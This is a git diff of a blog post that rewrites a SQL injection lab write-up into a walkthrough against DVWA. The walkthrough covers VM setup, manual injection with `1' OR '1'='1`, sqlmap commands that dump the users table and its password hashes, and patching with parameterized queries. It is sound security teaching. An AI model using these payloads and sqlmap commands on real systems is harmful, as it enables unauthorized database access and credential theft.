@@ -1,65 +1,166 @@
 ---
 layout: post
-title: "🧠 Exploiting and Securing: Lessons from a SQL Injection Lab"
-date: 2025-07-29
-tags: [security, SQLi, lab, incident-response, websec]
-categories: [security, labs]
-author: JohnSeanson
-description: "A hands-on exploration of SQL injection attacks, detection, and defenses in real-world web environments."
+title:  "Hands‑On SQL Injection Lab: DVWA from Exploit to Patch"
+date:   2025-07-30 09:00:00 -0500
+categories: pentesting web-security sql-injection
+tags: [DVWA, SQLi, penetration-testing, cyber-security, git]
 ---
 
-🔍 **Introduction**
+In this lab, we’ll walk through a complete **SQL Injection** lifecycle using the Damn Vulnerable Web Application (DVWA). You’ll learn how to:
 
-I’ve been digging into real-world threats that undermine trust in digital systems. SQL injection (SQLi) is one of the most widely exploited vulnerabilities—still sitting near the top of OWASP’s threat list. To sharpen my incident detection skills and understand attacker methodology, I launched a hands-on lab exploring how malicious actors weaponize SQLi and how defenders can build resilience into their applications and infrastructure.
+1. **Set up** a two‑VM environment: Kali Linux (attacker) & Ubuntu + DVWA (target)  
+2. **Manually exploit** the SQLi vulnerability  
+3. **Automate** the attack with `sqlmap`  
+4. **Troubleshoot** sessions, redirects, and cookie issues  
+5. **Patch** the vulnerability and **verify** the fix
 
-🧪 **Lab Setup**
+## TL;DR
 
-My lab environment mirrored what a typical attacker might encounter when probing public-facing web portals. Here's the stack I used:
+- **Setup**: Two‑VM lab with Kali Linux (attacker) and Ubuntu + DVWA (target)  
+- **Manual Exploit**: Used `1' OR '1'='1` in DVWA’s SQLi page to retrieve user records  
+- **Automation**: Leveraged `sqlmap` with valid `PHPSESSID` and `security=low` cookies to dump the `dvwa.users` table  
+- **Troubleshooting**: Resolved 302 redirects, cookie formatting, URL quoting, and cache issues (`--flush-session`)  
+- **Patch**: Switched DVWA to “High” security—uses PDO parameterized queries—and confirmed injection is blocked  
+- **Key Lesson**: Always use parameterized queries to prevent SQL Injection; hands‑on debugging is as important as the exploit.  
 
-**Test Platforms:** bWAPP and DVWA running on Ubuntu and Kali Linux virtual machines.
+---
 
-**Tools:**
-- Burp Suite for HTTP intercept and payload injection
-- Firefox dev tools and curl for lightweight testing
-- Manual log inspection and Zeek (for future log parsing integration)
+## 🛠 Environment Setup
 
-**Targeted Features:** login fields, search bars, and feedback forms—anywhere user input meets backend queries
+1. **Ubuntu Server** VM (DVWA target)  
+   - Install Apache, PHP, MySQL:  
+     ```bash
+     sudo apt update
+     sudo apt install -y apache2 php libapache2-mod-php php-mysql mysql-server
+     ```
+   - Clone DVWA and configure database:  
+     ```bash
+     cd /var/www/html
+     sudo git clone https://github.com/digininja/DVWA.git
+     cd DVWA/config
+     sudo cp config.inc.php.dist config.inc.php
+     ```
+   - Edit `config.inc.php`:
+     ```php
+     $_DVWA['db_user']                 = 'dvwauser';
+     $_DVWA['db_password']             = 'password';
+     $_DVWA['enable_phpids']           = false;
+     $_DVWA['disable_authentication_tokens'] = true;
+     ```
+   - Create database & user in MySQL:
+     ```sql
+     CREATE DATABASE dvwa;
+     CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'password';
+     GRANT ALL ON dvwa.* TO 'dvwauser'@'localhost';
+     FLUSH PRIVILEGES;
+     ```
+   - Restart Apache and complete setup at `http://<IP>/DVWA/setup.php`.
 
-I kept detailed logs and screenshots of payload attempts, tracking both successful exploitation and failed attempts to identify mitigation behaviors.
+   ![DVWA Setup Success](/assets/dvwa-setup.png)
+   Ensure you follow DVWA set-up carefully as a misconfigured file gave me quite the headache!
 
-🧵 **Payload Walkthrough**
+2. **Kali Linux** VM (Attacker)  
+   - Install tools:
+     ```bash
+     sudo apt update
+     sudo apt install -y sqlmap curl
+     ```
+   - Ensure you can browse to DVWA (`admin`/`password`) and set security **Low**.
 
-This section demonstrates the progression from basic tampering to deeper schema access:
+---
 
-✅ **Authentication Bypass**
+## 🔍 Phase 1: Manual SQL Injection
 
-- **Payload:** `' OR '1'='1`
-- **Outcome:** Unlocked basic login functionality
-- Various usernames and passwords revealed
+Navigate to:
 
-Each payload was documented with:
-- Full query syntax
-- Application response
-- Notes on why it succeeded (or failed)
-- Mitigation hints, such as evidence of input sanitization or WAF activity
+```
+http://<IP>/DVWA/vulnerabilities/sqli/
+```
 
-🛡️ **Defender’s Lens & Key Takeaways**
+Enter in **ID** field:
+```
+1' OR '1'='1
+```
+Submit and observe multiple user records returned—proof of SQLi.
 
-This exercise wasn’t just about exploitation—it was about defense.
+![](/assets/manual-sqli.png)
 
-**The Attacker’s Mindset:** Groups like Chaos thrive on automation and speed. SQLi helps them probe thousands of endpoints rapidly. Understanding their toolkit helps defenders set better traps.
+---
 
-**Why Input Validation Isn’t Enough:** Many apps still trust user input. Without prepared statements or parameterized queries, injection remains viable—even for legacy financial systems.
+## 🤖 Phase 2: Automating with sqlmap
 
-**Countermeasures Tested:**
-- WAF blocking of UNION queries
-- Error suppression settings
-- Implementation of PDOs in app rebuilds
+1. **Grab your session cookie** from the Kali browser (`PHPSESSID`, `security=low`).  
+2. **Verify** access to the injection point:
+   ```bash
+   curl -IL --cookie "PHPSESSID=<ID>; security=low" \
+       "http://<IP>/DVWA/vulnerabilities/sqli/?id=1"
+   # Expect HTTP/1.1 200 OK
+   ```
 
-This tied directly into my financial background: if client portals or budgeting tools are vulnerable, the entire trust ecosystem erodes.
+3. **Enumerate databases**:
+   ```bash
+   sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1" \
+     --cookie="PHPSESSID=<ID>; security=low" \
+     --dbs --batch --flush-session
+   ```
+4. **Dump `users` table**:
+   ```bash
+   sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1" \
+     --cookie="PHPSESSID=<ID>; security=low" \
+     -D dvwa -T users --dump --batch --flush-session
+   ```
 
-🎯 **Conclusion**
+   You’ll retrieve `user_id`, `user`, and MD5 `password` hashes.
 
-This lab reaffirmed my belief that defenders must think like adversaries. SQL injection isn’t just a theoretical concept—it’s alive, adaptable, and relevant. By stepping into the attacker’s shoes, I learned how fragile unprotected apps can be—and how strategic countermeasures can harden them fast.
+![](/assets/sqlmap-dump.png)
 
-**Next up:** I’ll be integrating log analysis and SIEM concepts using Zeek and Splunk to detect signs of injection in real time. Every system leaves traces, and learning how to spot them could make all the difference.
+---
+
+## 🔧 Troubleshooting Highlights
+
+* **302 Redirects**: Ensure you log in from **Kali VM**, not host.
+* **Cookie Errors**: Use correct format:
+  ```
+  --cookie="PHPSESSID=<ID>; security=low"
+  ```
+* **Malformed URL**: Wrap URL in quotes, include `?id=1`.
+* **Cache Issues**: Use `--flush-session` to clear sqlmap cache.
+
+---
+
+## 🛡 Phase 3: Patching & Verification
+
+1. In DVWA **Security** menu, set to **High** → Submit.
+2. Review `high.php`—it uses PDO parameterized queries:
+   ```php
+   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
+   $stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
+   $stmt->execute();
+   ```
+3. **Retest**:
+   * Manual payload `1' OR '1'='1` → **no data**
+   * `sqlmap --dbs` → **no injectable parameters**
+
+![](/assets/patch-verified.png)
+
+---
+
+## 🎓 Key Takeaways
+
+* **SQL Injection** exploits unvalidated input—classic payload `1' OR '1'='1`.
+* Tools like **sqlmap** automate enumeration but require proper cookies & session context.
+* **Prepared statements** are the gold‑standard defense against SQLi.
+* Hands‑on troubleshooting is as critical as the exploit itself.
+
+---
+
+## 📂 Resources
+
+* **GitHub Repo:** [JohnSeanson/sql-injection-dvwa-lab](https://github.com/JohnSeanson/sql-injection-dvwa-lab)
+* **Live Report:** [johnseanson.github.io](https://johnseanson.github.io)
+* **DVWA:** [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
+* **sqlmap:** [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
+
+---
+
+*Ready to try it yourself? Fork the repo, spin up your VMs, and share your results! Happy hacking and stay secure.*
